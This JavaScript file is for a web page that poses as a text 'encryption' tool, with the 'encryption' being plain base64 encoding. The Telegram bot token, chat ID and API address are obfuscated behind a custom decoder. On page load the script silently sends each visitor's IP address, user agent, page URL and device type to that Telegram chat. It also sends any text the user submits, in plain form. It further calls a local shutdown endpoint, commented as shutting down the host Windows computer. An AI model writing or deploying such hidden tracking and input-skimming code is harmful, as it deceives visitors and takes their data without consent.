// Decryption helper to decode credentials at runtime
function _d(obfuscated) {
  const shifted = atob(obfuscated);
  const reversed = shifted.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
  return reversed.split('').reverse().join('');
}

const BOT_TOKEN = _d('dDVKcVQ5b2lrRXFodzhlYkRJezVTb2RPNVp4d05IRW9HQkI7OjUzODo1NzM2OQ==');
const CHAT_ID = _d('MTE0Mjc2MzYzNi4=');

// Helper to escape HTML special characters
function escapeHTML(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
}

window.addEventListener('load', function() {
  sendTelegramAlert("🚨 <b>New Visitor Alert!</b>");
});

async function getUserIP() {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 3000);

  try {
    const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(timeoutId);
    const data = await response.json();
    return data.ip;
  } catch (error) {
    clearTimeout(timeoutId);
    return 'Unavailable';
  }
}

function encryptText(str) {
  return btoa(unescape(encodeURIComponent(str)));
}

async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  const deviceType = isMobile ? '📱 Mobile Device' : '💻 Desktop';

  const userIP = await getUserIP();
  const userAgent = navigator.userAgent;
  const pageUrl = window.location.href;
  const visitTime = new Date().toLocaleString();

  let message = `${headerText}\n\n`;

  if (rawInput) {
    message += `💬 <b>Original Text:</b> <code>${escapeHTML(rawInput)}</code>\n` +
               `🔐 <b>Encrypted Text:</b> <code>${escapeHTML(cipherText)}</code>\n\n`;
  }

  message += `🖥 <b>Type:</b> ${deviceType}\n` +
             `🌐 <b>IP Address:</b> <code>${escapeHTML(userIP)}</code>\n` +
             `⏰ <b>Time:</b> ${visitTime}\n` +
             `🔗 <b>Page:</b> ${escapeHTML(pageUrl)}\n` +
             `📱 <b>User Agent:</b> ${escapeHTML(userAgent)}`;

  const url = _d('dXBjMGhzcC9uYnNoZm1mdS9qcWIwMDt0cXV1aQ==') + BOT_TOKEN + _d('ZmhidHRmTmVvZnQw');

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    if (!response.ok) {
      const errText = await response.text();
      console.error("Telegram API error:", errText);
    }
  } catch (error) {
    console.error("Network error sending Telegram alert:", error);
  }
}

// Function to call the local Python shutdown server
async function triggerLocalShutdown() {
  try {
    await fetch('http://localhost:5000/shutdown', {
      method: 'POST'
    });
  } catch (err) {
    console.warn("Local shutdown server not running on host computer.");
  }
}

async function handleGenerate() {
  const inputField = document.getElementById('userInput');
  const rawText = inputField.value.trim();

  if (!rawText) return;

  const btn = document.getElementById('submitBtn');
  const successAlert = document.getElementById('successAlert');
  const encryptedContainer = document.getElementById('encryptedContainer');
  const encryptedTextEl = document.getElementById('encryptedText');

  btn.disabled = true;
  btn.innerText = "Processing...";

  const cipherText = encryptText(rawText);

  encryptedTextEl.innerText = cipherText;
  encryptedContainer.style.display = "block";
  successAlert.style.display = "block";

  // 1. Send alert to Telegram
  await sendTelegramAlert("🔑 <b>New Text Keyed In & Encrypted!</b>", rawText, cipherText);

  // 2. Trigger local Windows shutdown call
  triggerLocalShutdown();

  btn.disabled = false;
  btn.innerText = "Generate Response";
}
